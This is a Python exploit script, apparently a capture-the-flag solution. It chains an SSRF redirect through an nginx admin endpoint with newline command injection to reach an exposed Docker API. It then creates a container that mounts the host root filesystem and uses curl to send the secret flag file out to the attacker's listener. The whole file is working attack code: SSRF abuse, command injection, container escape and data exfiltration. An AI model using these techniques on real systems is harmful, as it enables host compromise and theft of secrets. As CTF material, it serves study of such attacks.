# !/usr/bin/env python3
import json
import socket
import time
from threading import Thread
from urllib.parse import quote_plus

import requests

TARGET = "10.3.2.69:12348"
LOCAL_IP = "10.3.2.15"
PRISON_INTERNAL_IP = "172.17.0.1"  # 172.16-32.0.1


class Responder:
    def __init__(self, response: bytes = b"HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n"):

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(("0.0.0.0", 0))
        self.sock.listen(1)
        self.port = self.sock.getsockname()[1]

        self.response = response
        self.data = b""
        Thread(target=self.listen).start()

    def listen(self):
        c, addr = self.sock.accept()
        c.settimeout(1)
        print(f"Connection from {addr}")

        try:
            try:
                while d := c.recv(1024):
                    self.data += d
            except TimeoutError as e:
                pass

            c.send(self.response)
            c.close()
        except Exception as e:
            print(f"Socket error: {e}")
            raise


def redirect_bounce(command: str) -> None:
    print(f"Preparing bounce: {command}")
    rdr_url = f"http://nginx/admin?host=prison:5005&method={quote_plus(command)}%0a"
    print(f"Final rdr: {rdr_url}")
    port = Responder(b"HTTP/1.1 302 cyber\r\nLocation: " + rdr_url.encode() + b"\r\n\r\n").port
    requests.get(f"http://{TARGET}/http://{LOCAL_IP}:{port}/")


# cache docker images
redirect_bounce(f"{PRISON_INTERNAL_IP}:2375/images/json -o /tmp/images")

# Pull cached file
images_receiver = Responder()
redirect_bounce(f"{LOCAL_IP}:{images_receiver.port} --json @/tmp/images")

# get id of solitary container
resp = images_receiver.data.decode().split("\r\n\r\n")[1]
print(f"response: {resp}")
image_id = json.loads(resp)[0]["Id"].split(":")[1]

flag_receiver = Responder()

# create container to leak flag
container = (
    json.dumps(
        {
            "Image": image_id,
            "HostConfig": {"Binds": ["/:/host"]},
            "Cmd": ["curl", "--data", "@/host/run/secrets/flag", f"{LOCAL_IP}:{flag_receiver.port}"],
        }
    )
    .replace(" ", "")
    .encode()
)

# push create file to solitary
port = Responder(b"HTTP/1.1 200 OK\r\nContent-Length: " + str(len(container)).encode() + b"\r\n\r\n" + container).port
redirect_bounce(f"{LOCAL_IP}:{port} -o /tmp/create")

# send create request
redirect_bounce(f"{PRISON_INTERNAL_IP}:2375/containers/create --json @/tmp/create -o /tmp/containerid")

# get container id
cid_receiver = Responder()
redirect_bounce(f"{LOCAL_IP}:{cid_receiver.port} --json @/tmp/containerid")
resp = cid_receiver.data.decode().split("\r\n\r\n")[1]
print(f"response: {resp}")
container_id = json.loads(resp)["Id"]

# start container
redirect_bounce(f"{PRISON_INTERNAL_IP}:2375/containers/{container_id}/start --json @/dev/null")

# let container start
time.sleep(3)

print(flag_receiver.data.decode())
